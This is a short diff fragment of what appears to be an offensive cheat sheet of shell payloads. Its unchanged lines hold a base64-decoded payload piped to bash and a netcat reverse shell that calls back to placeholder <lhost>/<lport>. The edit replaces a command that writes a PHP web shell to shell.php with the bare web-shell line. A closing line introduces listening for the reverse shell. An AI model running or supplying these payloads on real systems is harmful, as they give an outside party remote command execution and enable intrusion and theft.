@@ -21,7 +21,7 @@ echo <base64-shell> | base64 -d | bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <lhost> <lport> >/tmp/f
 ```
 ```
-echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
+<?php system($_REQUEST["<cmd>"]); ?>
 ```
 
 Listen for reverse shell with netcat:
